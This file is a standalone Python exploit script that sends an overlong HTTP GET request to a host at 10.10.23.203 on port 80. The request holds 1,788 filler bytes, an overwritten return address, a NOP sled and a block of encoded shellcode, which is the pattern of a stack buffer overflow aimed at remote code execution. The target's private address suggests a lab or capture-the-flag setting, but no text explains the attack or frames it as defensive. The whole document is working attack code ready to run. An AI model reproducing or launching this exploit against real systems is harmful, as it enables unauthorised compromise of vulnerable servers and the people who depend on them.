import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(('10.10.23.203',80))

buf = "GET"

buf += "A"*1788 + "\x5b\x4e\xd3\x77"

buf += "\x90" * 10

buf += b""
buf += b"\xbd\x20\x18\xbc\xb0\xda\xde\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x52\x31\x68\x12\x83\xe8\xfc\x03\x48\x16\x5e"
buf += b"\x45\x74\xce\x1c\xa6\x84\x0f\x41\x2e\x61\x3e\x41\x54"
buf += b"\xe2\x11\x71\x1e\xa6\x9d\xfa\x72\x52\x15\x8e\x5a\x55"
buf += b"\x9e\x25\xbd\x58\x1f\x15\xfd\xfb\xa3\x64\xd2\xdb\x9a"
buf += b"\xa6\x27\x1a\xda\xdb\xca\x4e\xb3\x90\x79\x7e\xb0\xed"
buf += b"\x41\xf5\x8a\xe0\xc1\xea\x5b\x02\xe3\xbd\xd0\x5d\x23"
buf += b"\x3c\x34\xd6\x6a\x26\x59\xd3\x25\xdd\xa9\xaf\xb7\x37"
buf += b"\xe0\x50\x1b\x76\xcc\xa2\x65\xbf\xeb\x5c\x10\xc9\x0f"
buf += b"\xe0\x23\x0e\x6d\x3e\xa1\x94\xd5\xb5\x11\x70\xe7\x1a"
buf += b"\xc7\xf3\xeb\xd7\x83\x5b\xe8\xe6\x40\xd0\x14\x62\x67"
buf += b"\x36\x9d\x30\x4c\x92\xc5\xe3\xed\x83\xa3\x42\x11\xd3"
buf += b"\x0b\x3a\xb7\x98\xa6\x2f\xca\xc3\xae\x9c\xe7\xfb\x2e"
buf += b"\x8b\x70\x88\x1c\x14\x2b\x06\x2d\xdd\xf5\xd1\x52\xf4"
buf += b"\x42\x4d\xad\xf7\xb2\x44\x6a\xa3\xe2\xfe\x5b\xcc\x68"
buf += b"\xfe\x64\x19\x3e\xae\xca\xf2\xff\x1e\xab\xa2\x97\x74"
buf += b"\x24\x9c\x88\x77\xee\xb5\x23\x82\x79\xb0\xb8\x81\x6d"
buf += b"\xac\xbc\x99\x89\xfe\x48\x7f\xfb\xee\x1c\x28\x94\x97"
buf += b"\x04\xa2\x05\x57\x93\xcf\x06\xd3\x10\x30\xc8\x14\x5c"
buf += b"\x22\xbd\xd4\x2b\x18\x68\xea\x81\x34\xf6\x79\x4e\xc4"
buf += b"\x71\x62\xd9\x93\xd6\x54\x10\x71\xcb\xcf\x8a\x67\x16"
buf += b"\x89\xf5\x23\xcd\x6a\xfb\xaa\x80\xd7\xdf\xbc\x5c\xd7"
buf += b"\x5b\xe8\x30\x8e\x35\x46\xf7\x78\xf4\x30\xa1\xd7\x5e"
buf += b"\xd4\x34\x14\x61\xa2\x38\x71\x17\x4a\x88\x2c\x6e\x75"
buf += b"\x25\xb9\x66\x0e\x5b\x59\x88\xc5\xdf\x69\xc3\x47\x49"
buf += b"\xe2\x8a\x12\xcb\x6f\x2d\xc9\x08\x96\xae\xfb\xf0\x6d"
buf += b"\xae\x8e\xf5\x2a\x68\x63\x84\x23\x1d\x83\x3b\x43\x34"


buf += "HTTP/1.1\r\n\r\n"

sock.send(buf)

sock.close()

#sys.argv[1]
